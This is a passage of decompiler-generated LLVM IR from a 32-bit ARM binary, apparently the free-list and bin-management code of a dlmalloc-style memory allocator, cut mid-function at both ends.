  %v1_11934 = add i32 %v2_11930, 4
  %v2_11934 = inttoptr i32 %v1_11934 to i32*
  %v3_11934 = load i32, i32* %v2_11934, align 4
  store i32 %v3_11934, i32* %r2.global-to-local, align 4
  %v1_11938 = add i32 %v3_11924, 12
  %v2_11938 = inttoptr i32 %v1_11938 to i32*
  %v3_11938 = load i32, i32* %v2_11938, align 4
  store i32 %v3_11938, i32* %r1.global-to-local, align 4
  %v1_1193c = or i32 %v3_11934, 1
  store i32 %v1_1193c, i32* %r2.global-to-local, align 4
  %v1_11940 = add i32 %v3_11924, 8
  store i32 %v1_11940, i32* %r4.global-to-local, align 4
  store i32 %v1_1193c, i32* %v2_11934, align 4
  %v0_11948 = load i32, i32* %ip.global-to-local, align 4
  %v1_11948 = load i32, i32* %r1.global-to-local, align 4
  %v2_11948 = add i32 %v1_11948, 8
  %v3_11948 = inttoptr i32 %v2_11948 to i32*
  store i32 %v0_11948, i32* %v3_11948, align 4
  %v0_1194c = load i32, i32* %r1.global-to-local, align 4
  %v1_1194c = load i32, i32* %ip.global-to-local, align 4
  %v2_1194c = add i32 %v1_1194c, 12
  %v3_1194c = inttoptr i32 %v2_1194c to i32*
  store i32 %v0_1194c, i32* %v3_1194c, align 4
  br label %dec_label_pc_12104

dec_label_pc_11954:                               ; preds = %dec_label_pc_11904
  store i32 %v0_118dc, i32* %r0.global-to-local, align 4
  %v1_11958 = call i32 @function_117b4(i32 %v0_118dc)
  store i32 %v1_11958, i32* %r0.global-to-local, align 4
  %v0_1195c = load i32, i32* @r4, align 4
  %v1_1195c = and i32 %v0_1195c, 2
  %v2_1195c = icmp eq i32 %v1_1195c, 0
  store i32 %v1_11958, i32* @r7, align 4
  br i1 %v2_1195c, label %dec_label_pc_11ab4, label %dec_label_pc_11968

dec_label_pc_11968:                               ; preds = %dec_label_pc_11954
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 124804, i32* %r1.global-to-local, align 4
  %v4_11970 = load i32, i32* inttoptr (i32 124836 to i32*), align 4
  store i32 %v4_11970, i32* @r0, align 4
  %v0_11974 = call i32 @function_126e4()
  store i32 %v0_11974, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11ab4

dec_label_pc_1197c:                               ; preds = %dec_label_pc_11ac8
  %v1_1197c = add i32 %v3_11ac8, 4
  %v2_1197c = inttoptr i32 %v1_1197c to i32*
  %v3_1197c = load i32, i32* %v2_1197c, align 4
  store i32 %v3_1197c, i32* %r3.global-to-local, align 4
  %v0_11980 = load i32, i32* @sl, align 4
  %v1_11984 = and i32 %v3_1197c, -4
  store i32 %v1_11984, i32* %r4.global-to-local, align 4
  %v1_11988 = add i32 %v3_11ac8, 12
  %v2_11988 = inttoptr i32 %v1_11988 to i32*
  %v3_11988 = load i32, i32* %v2_11988, align 4
  store i32 %v3_11988, i32* %ip.global-to-local, align 4
  %tmp203 = icmp ugt i32 %v0_11980, 255
  br i1 %tmp203, label %dec_label_pc_119e4, label %dec_label_pc_11990

dec_label_pc_11990:                               ; preds = %dec_label_pc_1197c
  %v9_11990 = icmp eq i32 %v3_11988, %v0_119e8
  br i1 %v9_11990, label %dec_label_pc_11998, label %dec_label_pc_119e4

dec_label_pc_11998:                               ; preds = %dec_label_pc_11990
  %v0_11998 = load i32, i32* @sb, align 4
  %v1_11998 = add i32 %v0_11998, 48
  %v2_11998 = inttoptr i32 %v1_11998 to i32*
  %v3_11998 = load i32, i32* %v2_11998, align 4
  store i32 %v3_11998, i32* %r3.global-to-local, align 4
  %v9_1199c = icmp eq i32 %v3_11ac8, %v3_11998
  br i1 %v9_1199c, label %dec_label_pc_119a4, label %dec_label_pc_119e4

dec_label_pc_119a4:                               ; preds = %dec_label_pc_11998
  %v1_119a4 = load i32, i32* @fp, align 4
  %tmp204 = icmp ugt i32 %v1_11984, %v1_119a4
  br i1 %tmp204, label %dec_label_pc_119ac, label %dec_label_pc_119e4

dec_label_pc_119ac:                               ; preds = %dec_label_pc_119a4
  %v2_119ac = sub i32 %v1_11984, %v0_11980
  store i32 %v2_119ac, i32* %r2.global-to-local, align 4
  %v2_119b0 = add i32 %v0_11980, %v3_11ac8
  store i32 %v2_119b0, i32* %r3.global-to-local, align 4
  %v1_119b4 = or i32 %v0_11980, 1
  store i32 %v1_119b4, i32* %r0.global-to-local, align 4
  %v1_119b8 = or i32 %v2_119ac, 1
  store i32 %v1_119b8, i32* %r1.global-to-local, align 4
  %v1_119bc = add i32 %v3_11ac8, 8
  store i32 %v1_119bc, i32* %r4.global-to-local, align 4
  %v2_119c0 = add i32 %v0_119e8, 8
  %v3_119c0 = inttoptr i32 %v2_119c0 to i32*
  store i32 %v2_119b0, i32* %v3_119c0, align 4
  %v0_119c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_119c4 = load i32, i32* %ip.global-to-local, align 4
  %v2_119c4 = add i32 %v1_119c4, 12
  %v3_119c4 = inttoptr i32 %v2_119c4 to i32*
  store i32 %v0_119c4, i32* %v3_119c4, align 4
  %v0_119c8 = load i32, i32* %r0.global-to-local, align 4
  %v1_119c8 = load i32, i32* @r6, align 4
  %v2_119c8 = add i32 %v1_119c8, 4
  %v3_119c8 = inttoptr i32 %v2_119c8 to i32*
  store i32 %v0_119c8, i32* %v3_119c8, align 4
  %v0_119cc = load i32, i32* %r3.global-to-local, align 4
  %v1_119cc = load i32, i32* @sb, align 4
  %v2_119cc = add i32 %v1_119cc, 48
  %v3_119cc = inttoptr i32 %v2_119cc to i32*
  store i32 %v0_119cc, i32* %v3_119cc, align 4
  %v0_119d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_119d0 = load i32, i32* %r3.global-to-local, align 4
  %v3_119d0 = add i32 %v1_119d0, %v0_119d0
  %v4_119d0 = inttoptr i32 %v3_119d0 to i32*
  store i32 %v0_119d0, i32* %v4_119d0, align 4
  %v0_119d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_119d4 = load i32, i32* %r3.global-to-local, align 4
  %v2_119d4 = add i32 %v1_119d4, 4
  %v3_119d4 = inttoptr i32 %v2_119d4 to i32*
  store i32 %v0_119d4, i32* %v3_119d4, align 4
  %v0_119d8 = load i32, i32* %ip.global-to-local, align 4
  %v1_119d8 = load i32, i32* %r3.global-to-local, align 4
  %v2_119d8 = add i32 %v1_119d8, 12
  %v3_119d8 = inttoptr i32 %v2_119d8 to i32*
  store i32 %v0_119d8, i32* %v3_119d8, align 4
  %v0_119dc = load i32, i32* %ip.global-to-local, align 4
  %v1_119dc = load i32, i32* %r3.global-to-local, align 4
  %v2_119dc = add i32 %v1_119dc, 8
  %v3_119dc = inttoptr i32 %v2_119dc to i32*
  store i32 %v0_119dc, i32* %v3_119dc, align 4
  br label %dec_label_pc_12104

dec_label_pc_119e4:                               ; preds = %dec_label_pc_119a4, %dec_label_pc_11998, %dec_label_pc_11990, %dec_label_pc_1197c
  %v9_119e4 = icmp eq i32 %v1_11984, %v0_11980
  %v2_119e8 = add i32 %v3_11988, 8
  %v3_119e8 = inttoptr i32 %v2_119e8 to i32*
  store i32 %v0_119e8, i32* %v3_119e8, align 4
  %v0_119ec = load i32, i32* %ip.global-to-local, align 4
  %v1_119ec = load i32, i32* %r5.global-to-local, align 4
  %v2_119ec = add i32 %v1_119ec, 12
  %v3_119ec = inttoptr i32 %v2_119ec to i32*
  store i32 %v0_119ec, i32* %v3_119ec, align 4
  br i1 %v9_119e4, label %dec_label_pc_11b44.loopexit, label %dec_label_pc_11a00

dec_label_pc_11a00:                               ; preds = %dec_label_pc_119e4
  %v0_11a00 = load i32, i32* %r4.global-to-local, align 4
  %tmp205 = icmp ugt i32 %v0_11a00, 255
  br i1 %tmp205, label %dec_label_pc_11a24, label %dec_label_pc_11a08

dec_label_pc_11a08:                               ; preds = %dec_label_pc_11a00
  store i32 124804, i32* %r2.global-to-local, align 4
  %v1_11a0c = load i32, i32* %r8.global-to-local, align 4
  %v2_11a0c = add i32 %v1_11a0c, 124804
  %v3_11a0c = inttoptr i32 %v2_11a0c to i32*
  %v4_11a0c = load i32, i32* %v3_11a0c, align 4
  %v3_11a10 = udiv i32 %v0_11a00, 8
  store i32 %v3_11a10, i32* %r0.global-to-local, align 4
  %v4_11a14 = mul nuw i32 %v3_11a10, 8
  %v5_11a14 = add i32 %v4_11a0c, %v4_11a14
  store i32 %v5_11a14, i32* %r3.global-to-local, align 4
  %v1_11a18 = add i32 %v5_11a14, 44
  store i32 %v1_11a18, i32* %ip.global-to-local, align 4
  %v1_11a1c = add i32 %v5_11a14, 52
  %v2_11a1c = inttoptr i32 %v1_11a1c to i32*
  %v3_11a1c = load i32, i32* %v2_11a1c, align 4
  store i32 %v3_11a1c, i32* @lr, align 4
  br label %dec_label_pc_11a7c

dec_label_pc_11a24:                               ; preds = %dec_label_pc_11a00
  store i32 %v0_11a00, i32* %r0.global-to-local, align 4
  %v1_11a28 = call i32 @function_117b4(i32 %v0_11a00)
  store i32 %v1_11a28, i32* %r0.global-to-local, align 4
  store i32 124804, i32* %ip.global-to-local, align 4
  %v1_11a30 = load i32, i32* %r8.global-to-local, align 4
  %v2_11a30 = add i32 %v1_11a30, 124804
  %v3_11a30 = inttoptr i32 %v2_11a30 to i32*
  %v4_11a30 = load i32, i32* %v3_11a30, align 4
  %v4_11a34 = mul i32 %v1_11a28, 8
  %v5_11a34 = add i32 %v4_11a30, %v4_11a34
  store i32 %v5_11a34, i32* %r3.global-to-local, align 4
  %v1_11a38 = add i32 %v5_11a34, 44
  store i32 %v1_11a38, i32* %ip.global-to-local, align 4
  %v1_11a3c = add i32 %v5_11a34, 52
  %v2_11a3c = inttoptr i32 %v1_11a3c to i32*
  %v3_11a3c = load i32, i32* %v2_11a3c, align 4
  store i32 %v3_11a3c, i32* @lr, align 4
  %v9_11a40 = icmp eq i32 %v3_11a3c, %v1_11a38
  br i1 %v9_11a40, label %dec_label_pc_11a7c, label %dec_label_pc_11a48

dec_label_pc_11a48:                               ; preds = %dec_label_pc_11a24
  %v1_11a48 = add i32 %v5_11a34, 56
  %v2_11a48 = inttoptr i32 %v1_11a48 to i32*
  %v3_11a48 = load i32, i32* %v2_11a48, align 4
  store i32 %v3_11a48, i32* %r1.global-to-local, align 4
  %v1_11a4c = add i32 %v3_11a48, 4
  %v2_11a4c = inttoptr i32 %v1_11a4c to i32*
  %v3_11a4c = load i32, i32* %v2_11a4c, align 4
  store i32 %v3_11a4c, i32* %r3.global-to-local, align 4
  %v0_11a50 = load i32, i32* %r4.global-to-local, align 4
  %v3_11a50 = icmp ult i32 %v0_11a50, %v3_11a4c
  br i1 %v3_11a50, label %.thread, label %dec_label_pc_11a6c.preheader

.thread:                                          ; preds = %dec_label_pc_11a48
  store i32 %v1_11a38, i32* @lr, align 4
  store i32 %v3_11a48, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11a7c

dec_label_pc_11a6c.preheader:                     ; preds = %dec_label_pc_11a48
  %v2_11a58 = or i32 %v0_11a50, 1
  store i32 %v2_11a58, i32* %r2.global-to-local, align 4
  %v1_11a6c179 = add i32 %v3_11a3c, 4
  %v2_11a6c180 = inttoptr i32 %v1_11a6c179 to i32*
  %v3_11a6c181 = load i32, i32* %v2_11a6c180, align 4
  store i32 %v3_11a6c181, i32* %r3.global-to-local, align 4
  %v3_11a70183 = icmp ult i32 %v2_11a58, %v3_11a6c181
  br i1 %v3_11a70183, label %dec_label_pc_11a68, label %dec_label_pc_11a78

dec_label_pc_11a68:                               ; preds = %dec_label_pc_11a6c.preheader, %dec_label_pc_11a68
  %v0_11a78184 = phi i32 [ %v3_11a68, %dec_label_pc_11a68 ], [ %v3_11a3c, %dec_label_pc_11a6c.preheader ]
  %v1_11a68 = add i32 %v0_11a78184, 8
  %v2_11a68 = inttoptr i32 %v1_11a68 to i32*
  %v3_11a68 = load i32, i32* %v2_11a68, align 4
  store i32 %v3_11a68, i32* @lr, align 4
  %v1_11a6c = add i32 %v3_11a68, 4
  %v2_11a6c = inttoptr i32 %v1_11a6c to i32*
  %v3_11a6c = load i32, i32* %v2_11a6c, align 4
  store i32 %v3_11a6c, i32* %r3.global-to-local, align 4
  %v3_11a70 = icmp ult i32 %v2_11a58, %v3_11a6c
  br i1 %v3_11a70, label %dec_label_pc_11a68, label %dec_label_pc_11a78

dec_label_pc_11a78:                               ; preds = %dec_label_pc_11a68, %dec_label_pc_11a6c.preheader
  %v0_11a78.lcssa = phi i32 [ %v3_11a3c, %dec_label_pc_11a6c.preheader ], [ %v3_11a68, %dec_label_pc_11a68 ]
  %v1_11a78 = add i32 %v0_11a78.lcssa, 12
  %v2_11a78 = inttoptr i32 %v1_11a78 to i32*
  %v3_11a78 = load i32, i32* %v2_11a78, align 4
  store i32 %v3_11a78, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11a7c

dec_label_pc_11a7c:                               ; preds = %.thread, %dec_label_pc_11a24, %dec_label_pc_11a08, %dec_label_pc_11a78
  %v0_11a9c = phi i32 [ %v1_11a38, %dec_label_pc_11a24 ], [ %v1_11a18, %dec_label_pc_11a08 ], [ %v3_11a78, %dec_label_pc_11a78 ], [ %v3_11a48, %.thread ]
  %v0_11a90 = phi i32 [ %v1_11a28, %dec_label_pc_11a24 ], [ %v3_11a10, %dec_label_pc_11a08 ], [ %v1_11a28, %dec_label_pc_11a78 ], [ %v1_11a28, %.thread ]
  %v1_11a80 = phi i32 [ %v1_11a30, %dec_label_pc_11a24 ], [ %v1_11a0c, %dec_label_pc_11a08 ], [ %v1_11a30, %dec_label_pc_11a78 ], [ %v1_11a30, %.thread ]
  store i32 124804, i32* %r2.global-to-local, align 4
  %v2_11a80 = add i32 %v1_11a80, 124804
  %v3_11a80 = inttoptr i32 %v2_11a80 to i32*
  %v4_11a80 = load i32, i32* %v3_11a80, align 4
  %v3_11a84 = sdiv i32 %v0_11a90, 32
  store i32 %v3_11a84, i32* %r3.global-to-local, align 4
  %v4_11a88 = mul nsw i32 %v3_11a84, 4
  %v5_11a88 = add i32 %v4_11a80, %v4_11a88
  store i32 %v5_11a88, i32* %r1.global-to-local, align 4
  %v1_11a8c = add i32 %v5_11a88, 820
  %v2_11a8c = inttoptr i32 %v1_11a8c to i32*
  %v3_11a8c = load i32, i32* %v2_11a8c, align 4
  %v1_11a90 = urem i32 %v0_11a90, 32
  store i32 %v1_11a90, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_11a98 = shl i32 1, %v1_11a90
  %v8_11a98 = or i32 %v3_11a8c, %v7_11a98
  store i32 %v8_11a98, i32* %r3.global-to-local, align 4
  %v1_11a9c = load i32, i32* @r6, align 4
  %v2_11a9c = add i32 %v1_11a9c, 12
  %v3_11a9c = inttoptr i32 %v2_11a9c to i32*
  store i32 %v0_11a9c, i32* %v3_11a9c, align 4
  %v0_11aa0 = load i32, i32* @lr, align 4
  %v1_11aa0 = load i32, i32* @r6, align 4
  %v2_11aa0 = add i32 %v1_11aa0, 8
  %v3_11aa0 = inttoptr i32 %v2_11aa0 to i32*
  store i32 %v0_11aa0, i32* %v3_11aa0, align 4
  %v0_11aa4 = load i32, i32* %r3.global-to-local, align 4
  %v1_11aa4 = load i32, i32* %r1.global-to-local, align 4
  %v2_11aa4 = add i32 %v1_11aa4, 820
  %v3_11aa4 = inttoptr i32 %v2_11aa4 to i32*
  store i32 %v0_11aa4, i32* %v3_11aa4, align 4
  %v0_11aa8 = load i32, i32* @r6, align 4
  %v1_11aa8 = load i32, i32* @lr, align 4
  %v2_11aa8 = add i32 %v1_11aa8, 12
  %v3_11aa8 = inttoptr i32 %v2_11aa8 to i32*
  store i32 %v0_11aa8, i32* %v3_11aa8, align 4
  %v0_11aac = load i32, i32* @r6, align 4
  %v1_11aac = load i32, i32* %ip.global-to-local, align 4
  %v2_11aac = add i32 %v1_11aac, 8
  %v3_11aac = inttoptr i32 %v2_11aac to i32*
  store i32 %v0_11aac, i32* %v3_11aac, align 4
  %v0_11ac8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11ac8

dec_label_pc_11ab4:                               ; preds = %dec_label_pc_11954, %dec_label_pc_1190c, %dec_label_pc_11968
  store i32 32, i32* %r8.global-to-local, align 4
  store i32 124804, i32* %r1.global-to-local, align 4
  %v4_11abc = load i32, i32* inttoptr (i32 124836 to i32*), align 4
  store i32 %v4_11abc, i32* @sb, align 4
  %v0_11ac0 = load i32, i32* @sl, align 4
  %v1_11ac0 = add i32 %v0_11ac0, 16
  store i32 %v1_11ac0, i32* @fp, align 4
  %v1_11ac4 = add i32 %v4_11abc, 52
  store i32 %v1_11ac4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11ac8

dec_label_pc_11ac8:                               ; preds = %dec_label_pc_11a7c, %dec_label_pc_11ab4
  %v0_119e8 = phi i32 [ %v0_11ac8.pre, %dec_label_pc_11a7c ], [ %v1_11ac4, %dec_label_pc_11ab4 ]
  %v1_11ac8 = add i32 %v0_119e8, 12
  %v2_11ac8 = inttoptr i32 %v1_11ac8 to i32*
  %v3_11ac8 = load i32, i32* %v2_11ac8, align 4
  store i32 %v3_11ac8, i32* @r6, align 4
  %v9_11acc = icmp eq i32 %v3_11ac8, %v0_119e8
  br i1 %v9_11acc, label %dec_label_pc_11ad4, label %dec_label_pc_1197c

dec_label_pc_11ad4:                               ; preds = %dec_label_pc_11ac8
  %v0_11ad4 = load i32, i32* @sl, align 4
  %tmp206 = icmp ult i32 %v0_11ad4, 256
  %v0_11b8c.pre = load i32, i32* @r7, align 4
  br i1 %tmp206, label %dec_label_pc_11ad4.dec_label_pc_11b8c_crit_edge, label %dec_label_pc_11adc

dec_label_pc_11ad4.dec_label_pc_11b8c_crit_edge:  ; preds = %dec_label_pc_11ad4
  %.pre200 = mul i32 %v0_11b8c.pre, 8
  br label %dec_label_pc_11b8c

dec_label_pc_11adc:                               ; preds = %dec_label_pc_11ad4
  %v4_11adc = mul i32 %v0_11b8c.pre, 8
  %v5_11adc = add i32 %v4_11adc, %v0_119e8
  store i32 %v5_11adc, i32* %r3.global-to-local, align 4
  %v1_11ae0 = add i32 %v5_11adc, -8
  store i32 %v1_11ae0, i32* %r1.global-to-local, align 4
  %v1_11ae4 = add i32 %v5_11adc, 4
  %v2_11ae4 = inttoptr i32 %v1_11ae4 to i32*
  %storemerge.pre = load i32, i32* %v2_11ae4, align 4
  br label %dec_label_pc_11b84

dec_label_pc_11aec:                               ; preds = %dec_label_pc_11b84
  %v1_11aec = add i32 %v1_11b14, 4
  %v2_11aec = inttoptr i32 %v1_11aec to i32*
  %v3_11aec = load i32, i32* %v2_11aec, align 4
  store i32 %v3_11aec, i32* %r3.global-to-local, align 4
  %v1_11af0 = and i32 %v3_11aec, -4
  store i32 %v1_11af0, i32* %r2.global-to-local, align 4
  %v3_11af4 = icmp ult i32 %v1_11af0, %v0_11ad4
  %v1_11af8 = add i32 %v1_11b14, 12
  %v2_11af8 = inttoptr i32 %v1_11af8 to i32*
  %v3_11af8 = load i32, i32* %v2_11af8, align 4
  store i32 %v3_11af8, i32* %r0.global-to-local, align 4
  br i1 %v3_11af4, label %dec_label_pc_11b84, label %dec_label_pc_11b00

dec_label_pc_11b00:                               ; preds = %dec_label_pc_11aec
  %v1_11b00 = add i32 %v1_11b14, 8
  %v2_11b00 = inttoptr i32 %v1_11b00 to i32*
  %v3_11b00 = load i32, i32* %v2_11b00, align 4
  store i32 %v3_11b00, i32* %r1.global-to-local, align 4
  %v1_11b04 = add i32 %v3_11b00, 12
  %v2_11b04 = inttoptr i32 %v1_11b04 to i32*
  %v3_11b04 = load i32, i32* %v2_11b04, align 4
  store i32 %v3_11b04, i32* %r3.global-to-local, align 4
  %v9_11b08 = icmp eq i32 %v3_11b04, %v1_11b14
  br i1 %v9_11b08, label %dec_label_pc_11b10, label %dec_label_pc_11b1c

dec_label_pc_11b10:                               ; preds = %dec_label_pc_11b00
  %v1_11b10 = add i32 %v3_11af8, 8
  %v2_11b10 = inttoptr i32 %v1_11b10 to i32*
  %v3_11b10 = load i32, i32* %v2_11b10, align 4
  store i32 %v3_11b10, i32* %r3.global-to-local, align 4
  %v9_11b14 = icmp eq i32 %v3_11b10, %v1_11b14
  br i1 %v9_11b14, label %dec_label_pc_11b20, label %dec_label_pc_11b1c

dec_label_pc_11b1c:                               ; preds = %dec_label_pc_11b00, %dec_label_pc_11b10
  %v0_11b1c = call i32 @function_12b14()
  store i32 %v0_11b1c, i32* %r0.global-to-local, align 4
  %v0_11b20.pre = load i32, i32* @sl, align 4
  %v1_11b20.pre = load i32, i32* @r2, align 4
  %v0_11b28.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_11b20

dec_label_pc_11b20:                               ; preds = %dec_label_pc_11b10, %dec_label_pc_11b1c
  %v1_11b28 = phi i32 [ %v3_11af8, %dec_label_pc_11b10 ], [ %v0_11b1c, %dec_label_pc_11b1c ]
  %v0_11b28 = phi i32 [ %v3_11b00, %dec_label_pc_11b10 ], [ %v0_11b28.pre, %dec_label_pc_11b1c ]
  %v1_11b20 = phi i32 [ %v1_11af0, %dec_label_pc_11b10 ], [ %v1_11b20.pre, %dec_label_pc_11b1c ]
  %v0_11b20 = phi i32 [ %v0_11ad4, %dec_label_pc_11b10 ], [ %v0_11b20.pre, %dec_label_pc_11b1c ]
  %v2_11b20 = sub i32 %v1_11b20, %v0_11b20
  store i32 %v2_11b20, i32* %lr.global-to-local, align 4
  %v2_11b28 = add i32 %v1_11b28, 8
  %v3_11b28 = inttoptr i32 %v2_11b28 to i32*
  store i32 %v0_11b28, i32* %v3_11b28, align 4
  %v0_11b2c = load i32, i32* %r0.global-to-local, align 4
  %v1_11b2c = load i32, i32* %r1.global-to-local, align 4
  %v2_11b2c = add i32 %v1_11b2c, 12
  %v3_11b2c = inttoptr i32 %v2_11b2c to i32*
  store i32 %v0_11b2c, i32* %v3_11b2c, align 4
  %v0_11b30 = load i32, i32* %ip.global-to-local, align 4
  %v1_11b30 = add i32 %v0_11b30, 8
  store i32 %v1_11b30, i32* %r0.global-to-local, align 4
  %tmp207 = icmp ugt i32 %v2_11b20, 15
  br i1 %tmp207, label %dec_label_pc_11b50, label %dec_label_pc_11b38

dec_label_pc_11b38:                               ; preds = %dec_label_pc_11b20
  %v1_11b38 = load i32, i32* %r2.global-to-local, align 4
  %v2_11b38 = add i32 %v1_11b38, %v0_11b30
  store i32 %v2_11b38, i32* %r2.global-to-local, align 4
  %v1_11b3c = add i32 %v2_11b38, 4
  %v2_11b3c = inttoptr i32 %v1_11b3c to i32*
  %v3_11b3c = load i32, i32* %v2_11b3c, align 4
  store i32 %v3_11b3c, i32* %r3.global-to-local, align 4
  store i32 %v1_11b30, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11b44

dec_label_pc_11b44.loopexit:                      ; preds = %dec_label_pc_119e4
  %v1_119f0 = load i32, i32* @r6, align 4
  %v2_119f0 = load i32, i32* @sl, align 4
  %v3_119f0 = add i32 %v2_119f0, %v1_119f0
  store i32 %v3_119f0, i32* %r2.global-to-local, align 4
  %v2_119f4 = add i32 %v3_119f0, 4
  %v3_119f4 = inttoptr i32 %v2_119f4 to i32*
  %v4_119f4 = load i32, i32* %v3_119f4, align 4
  store i32 %v4_119f4, i32* %r3.global-to-local, align 4
  %v2_119f8 = add i32 %v1_119f0, 8
  store i32 %v2_119f8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11b44

dec_label_pc_11b44:                               ; preds = %.dec_label_pc_11b44_crit_edge, %dec_label_pc_11b44.loopexit, %dec_label_pc_11b38
  %v1_11b48 = phi i32 [ %v4_11c6c, %.dec_label_pc_11b44_crit_edge ], [ %v3_119f0, %dec_label_pc_11b44.loopexit ], [ %v2_11b38, %dec_label_pc_11b38 ]
  %v0_11b44 = phi i32 [ %v7_11c6c, %.dec_label_pc_11b44_crit_edge ], [ %v4_119f4, %dec_label_pc_11b44.loopexit ], [ %v3_11b3c, %dec_label_pc_11b38 ]
  %v1_11b44 = or i32 %v0_11b44, 1
  store i32 %v1_11b44, i32* %r3.global-to-local, align 4
  %v2_11b48 = add i32 %v1_11b48, 4
  %v3_11b48 = inttoptr i32 %v2_11b48 to i32*
  store i32 %v1_11b44, i32* %v3_11b48, align 4
  br label %dec_label_pc_12104

dec_label_pc_11b50:                               ; preds = %dec_label_pc_11b20
  %v1_11b50 = load i32, i32* @sl, align 4
  %v2_11b50 = add i32 %v1_11b50, %v0_11b30
  store i32 %v2_11b50, i32* %r2.global-to-local, align 4
  %v1_11b54 = or i32 %v1_11b50, 1
  store i32 %v1_11b54, i32* %r3.global-to-local, align 4
  %v0_11b58 = load i32, i32* %lr.global-to-local, align 4
  %v1_11b58 = or i32 %v0_11b58, 1
  store i32 %v1_11b58, i32* %r1.global-to-local, align 4
  store i32 %v1_11b30, i32* %r4.global-to-local, align 4
  %v2_11b60 = add i32 %v0_11b30, 4
  %v3_11b60 = inttoptr i32 %v2_11b60 to i32*
  store i32 %v1_11b54, i32* %v3_11b60, align 4
  %v0_11b64 = load i32, i32* %r2.global-to-local, align 4
  %v1_11b64 = load i32, i32* @r6, align 4
  %v2_11b64 = add i32 %v1_11b64, 8
  %v3_11b64 = inttoptr i32 %v2_11b64 to i32*
  store i32 %v0_11b64, i32* %v3_11b64, align 4
  %v0_11b68 = load i32, i32* %r2.global-to-local, align 4
  %v1_11b68 = load i32, i32* @r6, align 4
  %v2_11b68 = add i32 %v1_11b68, 12
  %v3_11b68 = inttoptr i32 %v2_11b68 to i32*
  store i32 %v0_11b68, i32* %v3_11b68, align 4
  %v0_11b6c = load i32, i32* %lr.global-to-local, align 4
  %v1_11b6c = load i32, i32* %r2.global-to-local, align 4
  %v3_11b6c = add i32 %v1_11b6c, %v0_11b6c
  %v4_11b6c = inttoptr i32 %v3_11b6c to i32*
  store i32 %v0_11b6c, i32* %v4_11b6c, align 4
  %v0_11b70 = load i32, i32* %r1.global-to-local, align 4
  %v1_11b70 = load i32, i32* %r2.global-to-local, align 4
  %v2_11b70 = add i32 %v1_11b70, 4
  %v3_11b70 = inttoptr i32 %v2_11b70 to i32*
  store i32 %v0_11b70, i32* %v3_11b70, align 4
  %v0_11b74 = load i32, i32* @r6, align 4
  %v1_11b74 = load i32, i32* %r2.global-to-local, align 4
  %v2_11b74 = add i32 %v1_11b74, 12
  %v3_11b74 = inttoptr i32 %v2_11b74 to i32*
  store i32 %v0_11b74, i32* %v3_11b74, align 4
  %v0_11b78 = load i32, i32* @r6, align 4
  %v1_11b78 = load i32, i32* %r2.global-to-local, align 4
  %v2_11b78 = add i32 %v1_11b78, 8
  %v3_11b78 = inttoptr i32 %v2_11b78 to i32*
  store i32 %v0_11b78, i32* %v3_11b78, align 4
  br label %dec_label_pc_12104

dec_label_pc_11b84:                               ; preds = %dec_label_pc_11aec, %dec_label_pc_11adc
  %v1_11b14 = phi i32 [ %storemerge.pre, %dec_label_pc_11adc ], [ %v3_11af8, %dec_label_pc_11aec ]
  store i32 %v1_11b14, i32* %ip.global-to-local, align 4
  %v9_11b84 = icmp eq i32 %v1_11b14, %v1_11ae0
  br i1 %v9_11b84, label %dec_label_pc_11b8c.loopexit, label %dec_label_pc_11aec

dec_label_pc_11b8c.loopexit:                      ; preds = %dec_label_pc_11b84
  br label %dec_label_pc_11b8c

dec_label_pc_11b8c:                               ; preds = %dec_label_pc_11ad4.dec_label_pc_11b8c_crit_edge, %dec_label_pc_11b8c.loopexit
  %v4_11bbc.pre-phi = phi i32 [ %.pre200, %dec_label_pc_11ad4.dec_label_pc_11b8c_crit_edge ], [ %v4_11adc, %dec_label_pc_11b8c.loopexit ]
  %v1_11b8c = add i32 %v0_11b8c.pre, 1
  store i32 %v1_11b8c, i32* %r2.global-to-local, align 4
  %v1_11b90 = urem i32 %v1_11b8c, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 124804, i32* %r0.global-to-local, align 4
  %v6_11b9c = shl i32 1, %v1_11b90
  store i32 %v6_11b9c, i32* %ip.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_11ba4 = load i32, i32* inttoptr (i32 124836 to i32*), align 4
  store i32 %v4_11ba4, i32* %r3.global-to-local, align 4
  %v3_11ba8 = udiv i32 %v1_11b8c, 32
  store i32 %v3_11ba8, i32* @r5, align 4
  %v4_11bac = mul nuw nsw i32 %v3_11ba8, 4
  %v5_11bac = add i32 %v4_11ba4, %v4_11bac
  store i32 %v5_11bac, i32* %r2.global-to-local, align 4
  %v1_11bb0 = add i32 %v5_11bac, 820
  %v2_11bb0 = inttoptr i32 %v1_11bb0 to i32*
  %v3_11bb0 = load i32, i32* %v2_11bb0, align 4
  store i32 %v3_11bb0, i32* @r4, align 4
  %v1_11bb4 = add i32 %v4_11ba4, 52
  store i32 %v1_11bb4, i32* %r3.global-to-local, align 4
  store i32 32, i32* @r8, align 4
  %v5_11bbc = add i32 %v1_11bb4, %v4_11bbc.pre-phi
  store i32 %v5_11bbc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11bc0

dec_label_pc_11bc0:                               ; preds = %dec_label_pc_11c28, %dec_label_pc_11b8c
  %v1_11bc8 = phi i32 [ %v1_11bc8.pre, %dec_label_pc_11c28 ], [ %v3_11bb0, %dec_label_pc_11b8c ]
  %v0_11bc8 = phi i32 [ %v0_11bc0.pre, %dec_label_pc_11c28 ], [ %v6_11b9c, %dec_label_pc_11b8c ]
  %v1_11bc0 = sub i32 1, %v0_11bc8
  %v2_11bc0 = icmp ult i32 %v0_11bc8, 2
  %v1_11bc0. = select i1 %v2_11bc0, i32 %v1_11bc0, i32 0
  store i32 %v1_11bc0., i32* %r3.global-to-local, align 4
  %tmp141 = icmp ugt i32 %v0_11bc8, %v1_11bc8
